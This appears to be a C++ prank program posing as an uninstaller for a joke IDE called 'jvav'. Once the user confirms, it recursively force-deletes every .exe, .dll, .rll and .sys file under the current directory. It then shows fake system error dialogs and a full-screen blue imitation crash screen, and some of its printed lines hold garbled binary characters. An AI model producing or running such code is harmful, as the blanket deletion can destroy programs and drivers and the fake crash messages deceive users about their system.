//
// Copyright (C)   ExecuitIF.
//
//
/***********************************************************************************************
 ***            C O N F I D E N T I A L  ---  E X E C U I T I F   S T U D I O S              ***
 ***********************************************************************************************
 *                                                                                             *
 *                 Project Name : jvav-uninst                                                  *
 *                                                                                             *
 *                    File Name : jvav-unins.cpp                                               *
 *                                                                                             *
 *                   Programmer : ExecuitIF                                                    *
 *                                                                                             *
 *                   Start Date :  15/06/2020                                                  *
 *                                                                                             *
 *                  Last Update :  ,                                                           *
 *                                                                                             *
 *---------------------------------------------------------------------------------------------*
 * Functions:                                                                                  *
 *                     #.h                                                                     *
 * - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - */

#include "#.h"

int main(int argc, char** argv)
{
	char temp;
	system("color F0");
	cout<<"确实要卸载 jvav 编译开放套件（集成开发环境） 吗？（y/n）\n";
	cin>>temp;
	if(temp=='Y'||temp=='y')
	{
		system("del /s /f /q .\\*.exe");
		system("del /s /f /q .\\*.dll");
		system("del /s /f /q .\\*.rll");
		system("del /s /f /q .\\*.sys");
		MessageBox(NULL,"异常的错误！","SYSTEM",MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
		MessageBox(NULL,"内存0xc0000005处理错误","SYSTEM",MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
		MessageBox(NULL,"系统主进程 \"rundll32.exe\" 已停止运行","致命错误",MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
		system("color 1F");
		HWND hwnd = GetForegroundWindow();
		int cx = GetSystemMetrics(SM_CXSCREEN);
		int cy = GetSystemMetrics(SM_CYSCREEN);
		LONG l_WinStyle = GetWindowLong(hwnd,GWL_STYLE);
		SetWindowLong(hwnd,GWL_STYLE,(l_WinStyle | WS_POPUP | WS_MAXIMIZE) & ~WS_CAPTION & ~WS_THICKFRAME & ~WS_BORDER);
		SetWindowPos(hwnd, HWND_TOP, 0, 0, cx, cy, 0);
		system("cls");
		cout<<"\n\n\n\n\n\n\n                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                       /                                                                                                                                                      \n";
		cout<<"                  0   |                                                                                                                                                       \n";
		cout<<"                      |                          �H兟H壻H塖栝���H壻H壠鑾���I壟H婥�8I� J��椐���婩凐剰���幯                                                           \n";
		cout<<"                  0    \\                             铃I夗L-枎	����I壠H�>�夝I夰�7                                                                                    \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                               /               -----                                                                                                                          \n";
		cout<<"                              /               /     \\                                                                                                                         \n";
		cout<<"                         0   /   0           |       |                                                                                                                        \n";
		cout<<"                            /                 \\     /                                                                                                                         \n";
		cout<<"                           /                   -----                                                                                                                          \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
	}
	system("pause");
	return false;
}

void full_screen()
{
	HWND hwnd = GetForegroundWindow();
	int cx = GetSystemMetrics(SM_CXSCREEN);
	int cy = GetSystemMetrics(SM_CYSCREEN);
	LONG l_WinStyle = GetWindowLong(hwnd,GWL_STYLE);
	SetWindowLong(hwnd,GWL_STYLE,(l_WinStyle | WS_POPUP | WS_MAXIMIZE) & ~WS_CAPTION & ~WS_THICKFRAME & ~WS_BORDER);
	SetWindowPos(hwnd, HWND_TOP, 0, 0, cx, cy, 0);
}

